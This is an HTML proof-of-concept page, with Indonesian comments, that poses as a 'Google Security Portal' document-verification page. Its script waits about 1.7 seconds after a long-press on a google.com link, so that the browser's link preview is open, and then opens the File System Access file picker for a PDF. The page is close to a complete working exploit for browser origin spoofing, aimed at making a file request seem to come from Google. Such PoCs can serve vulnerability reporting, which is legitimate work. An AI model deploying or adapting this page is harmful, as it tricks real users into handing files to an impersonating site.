<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Security PoC - File Picker Origin Spoofing</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #fcfcfc;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        h1 {
            font-size: 22px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 16px 32px;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 12px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Verifikasi Dokumen Pengguna</h1>

    <!-- Tautan target untuk memicu Preview Page -->
    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page</a>

    <div class="footer-note">Sistem verifikasi aman berbasis cloud.</div>

    <script>
        let triggered = false;

        // Fungsi eksekusi utama File System Access API
        const executeAttackVector = () => {
            if (triggered) return;
            triggered = true;

            // Timer disesuaikan untuk menunggu transisi animasi panel preview terbuka
            setTimeout(async () => {
                try {
                    await window.showOpenFilePicker({
                        multiple: false,
                        types: [{
                            description: 'Dokumen Verifikasi Resmi (.pdf)',
                            accept: { 'application/pdf': ['.pdf'] }
                        }]
                    });
                } catch (err) {
                    // Menangkap error pembatalan atau jika patch keamanan browser sudah aktif
                    console.debug("Aksi file picker dihentikan atau diblokir:", err.message);
                } finally {
                    // Reset status agar dapat diuji kembali jika diperlukan
                    setTimeout(() => { triggered = false; }, 1000);
                }
            }, 1700); // Waktu optimal jeda milidetik untuk membuka ephemeral tab
        };

        // Menggunakan multi-event listener untuk memperkuat pemicu interaksi seluler
        const targetElement = document.getElementById("targetLink");

        targetElement.addEventListener("contextmenu", (e) => {
            executeAttackVector();
        });

        targetElement.addEventListener("touchstart", (e) => {
            // Membantu menangkap awal gestur sentuh tahan lama (long-press)
            // Tanpa menghentikan fungsi bawaan browser agar preview tetap muncul
        }, { passive: true });
    </script>

</body>
</html>
